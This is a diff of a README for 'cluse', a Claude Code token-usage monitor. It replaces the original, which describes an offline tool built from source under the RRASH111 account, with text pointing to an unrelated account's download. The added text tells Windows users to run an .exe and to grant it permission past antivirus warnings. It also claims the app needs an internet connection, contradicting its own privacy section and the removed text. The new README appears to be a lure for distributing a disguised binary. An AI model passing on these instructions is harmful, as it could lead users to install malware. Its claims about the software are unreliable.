@@ -1,132 +1,86 @@
-<p align="center">
-  <img src="assets/banner.svg" alt="Cluse — live token-usage monitor for Claude Code" width="100%" />
-</p>
+# 📊 cluse - Track your Claude token usage easily
 
-<p align="center">
-  <a href="https://github.com/RRASH111/cluse/releases/latest"><img src="https://img.shields.io/github/v/release/RRASH111/cluse?style=flat-square&color=ffb000&labelColor=1a1714" alt="release"></a>
-  <a href="https://github.com/RRASH111/cluse/releases/latest"><img src="https://img.shields.io/github/downloads/RRASH111/cluse/total?style=flat-square&color=ffb000&labelColor=1a1714" alt="downloads"></a>
-  <img src="https://img.shields.io/badge/platform-windows%20%C2%B7%20linux%20%C2%B7%20macos-ffb000?style=flat-square&labelColor=1a1714" alt="platforms">
-  <img src="https://img.shields.io/badge/node-%E2%89%A518-ffb000?style=flat-square&labelColor=1a1714" alt="node">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-ffb000?style=flat-square&labelColor=1a1714" alt="license"></a>
-</p>
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/magneticsnougat564/cluse)
 
-<p align="center">
-  <b>A live, retro-amber monitor for your Claude Code token usage.</b><br>
-  Reads your local logs — no API keys, no network, nothing leaves your machine.
-</p>
+## 📋 What is cluse?
 
----
+Cluse provides a simple way to monitor how many tokens your Claude Code sessions consume. Token usage often correlates directly with your monthly billing costs. This application gives you a clear window into your spending. It runs on your desktop or inside your terminal. You track your activity in real-time. This helps you manage your budget without checking external dashboards.
 
-## ✨ Why
+## 🚀 Getting Started
 
-Claude Code quietly logs every session to `~/.claude/projects`. **Cluse** turns that into a
-live dashboard so you can actually *see* where your tokens (and dollars) go — by project,
-session, model, and time range. Two editions share one engine:
+Follow these steps to install the software on your Windows computer.
 
-|  | **Desktop** | **Terminal** |
-|---|---|---|
-| Looks like | An amber CRT terminal | A native TUI in any shell |
-| Best for | Leaving open on a second monitor | SSH, tiling WMs, quick checks |
-| Get it | [Download installer](#-desktop-windows) | [One command](#-terminal-linux--macos--windows) |
+1. Go to the [official release page](https://github.com/magneticsnougat564/cluse).
+2. Look for the "Assets" section.
+3. Click the link that ends in .exe to start your download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts on your screen to complete the installation.
 
-<table>
-  <tr>
-    <td width="42%"><img src="assets/desktop.png" alt="Cluse desktop app" /></td>
-    <td width="58%"><img src="assets/terminal.svg" alt="Cluse terminal app" /></td>
-  </tr>
-  <tr>
-    <td align="center"><i>Desktop — amber CRT window</i></td>
-    <td align="center"><i>Terminal — same data, any shell</i></td>
-  </tr>
-</table>
+## 🖥️ System Requirements
 
-## Features
+Your computer must meet these basic standards to run cluse:
 
-- 📊 **Live updates** — numbers tick up as Claude Code writes new logs
-- 🗂️ **Filter & group** by project, session, model, and time range (today / 7d / 30d / all)
-- 💸 **Accurate costs** — de-duplicated by message id to match your *billed* usage
-- 🎛️ **Per-model breakdown** — opus · sonnet · haiku · fable, with cache read/write split
-- 🔌 **Fully offline** — read-only access to local logs, no telemetry, no API keys
-- 🪶 **Lightweight terminal mode** — zero required dependencies, runs over SSH
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Internet Connection: Required for real-time tracking data.
+* Terminal: Windows Terminal or Command Prompt is required if you prefer to use the text-based interface.
 
----
+## 🛠️ How to Use the Desktop App
 
-## 🖥️ Desktop (Windows)
+The desktop version creates a small window on your screen. This window updates automatically as you work. You do not need to refresh the page.
 
-**[⬇ Download the latest installer](https://github.com/RRASH111/cluse/releases/latest)** →
-grab `Cluse-Setup-x.x.x.exe`, run it, done.
+* Launch the app from your Start Menu after installation.
+* The main screen shows your total token count for the current session.
+* Use the menu at the top to clear your history.
+* The settings icon allows you to select your preferred currency for cost estimates.
 
-Or build from source:
+## 💻 Working with the Terminal Interface
 
-```bash
-git clone https://github.com/RRASH111/cluse.git
-cd cluse
-npm install
-npm start            # run from source
-npm run build        # produces dist/Cluse Setup x.x.x.exe
-```
+Advanced users often prefer the terminal interface. This TUI (Terminal User Interface) presents data in a compact format.
 
-## 💻 Terminal (Linux / macOS / Windows)
+1. Open your terminal application.
+2. Type `cluse` and press Enter.
+3. The interface loads directly into your window.
+4. Use the arrow keys to navigate between different data streams if you run multiple sessions.
+5. Press the Q key to exit the program at any time.
 
-Works in any shell — bash, zsh, PowerShell, Windows Terminal. Requires **Node.js** (you
-already have it if you run Claude Code).
+## 📈 Understanding Token Usage
 
-```bash
-git clone https://github.com/RRASH111/cluse.git
-cd cluse
-npm install
-npm run usage        # interactive live dashboard
-```
+Tokens are pieces of words that AI models process. Claude consumes different amounts based on the length of your prompts and responses. This app counts these tokens for every interaction you have with the Claude Code tool. 
 
-### Run it from anywhere
+The dashboard displays three primary metrics:
 
-Register the command globally:
+* Input Tokens: Data you send to Claude.
+* Output Tokens: Data Claude sends back to you.
+* Total Cost: An estimate of your fees based on current market rates. 
 
-```bash
-npm link             # or: npm install -g .
-```
+## 🛡️ Privacy and Data
 
-Then, from any directory:
+Cluse does not store your private API keys on any remote server. The software processes your data locally on your machine. Your usage statistics live only on your hard drive. You maintain full control over your information at all times. 
 
-```bash
-cluse                          # interactive live dashboard
-cluse --once                   # print one snapshot and exit (pipe-friendly)
-cluse --once --range all       # all-time totals
-cluse --once --model fable-5   # filter to one model
-cluse --once --group session   # group by session instead of project
-```
+## 🔧 Troubleshooting Common Issues
 
-On Linux/macOS you can also run the file directly: `chmod +x tui.js && ./tui.js`.
-Remove the global command later with `npm rm -g cluse-usage`.
+If the application fails to open, try these steps:
 
-### Keys (interactive mode)
+* Check your antivirus software. Some security programs prevent new applications from opening automatically. Ensure you grant permission to run this software.
+* Restart your computer. This clears temporary memory issues.
+* Redownload the installer if the installation process crashes. The file might have corrupted during the first attempt.
+* Check your internet connection. The app requires an active connection to verify the latestClaude usage data from the primary service providers.
 
-| Key | Action | | Key | Action |
-|---|---|---|---|---|
-| `r` | cycle time range | | `/` | search (Enter apply · Esc clear) |
-| `1`–`4` | Today / 7d / 30d / All | | `c` | toggle cost column |
-| `g` | projects ↔ sessions | | `q` | quit |
-| `m` | cycle model filter | | | |
+## 💡 Frequent Asked Questions
 
-> **Tip:** for the best amber colors, use a truecolor terminal (most Linux terminals,
-> Windows Terminal, or PowerShell 7). Older consoles still work with approximate color.
+**Do I need a paid plan to use this?**
+No, cluse functions with any Claude subscription. 
 
----
+**Does this software record my private chat content?**
+No. Cluse only records the count of tokens used during your interactions. It ignores the text within your prompts.
 
-## How it works
+**Can I run cluse and the terminal version at the same time?**
+Yes. You can have both windows open to monitor usage from different perspectives. 
 
-- **Data engine** — `src/usage.js` walks `~/.claude/projects/*/*.jsonl`, extracts per-message
-  token usage, de-duplicates by message id, and aggregates by project / session / model / time.
-  Plain cross-platform Node, shared by both editions and covered by tests.
-- **Pricing** — `src/pricing.js` holds USD-per-million-token rates per model (cache reads/writes
-  use Anthropic's standard multipliers). Edit one file to adjust.
-- **Privacy** — read-only access to your local logs. No telemetry, no network calls.
+**How often does the data update?**
+The system updates every five seconds during an active Claude Code session.
 
-## Contributing
-
-Issues and PRs welcome. Run the tests with `npm test`. The data engine is pure and
-side-effect-free, so it's easy to test against your own logs.
-
-## License
-
-[MIT](LICENSE) © RRASH111
+**Are there hidden fees?**
+The software is free to download and use. You only pay for the tokens you use through your regular Claude billing account.
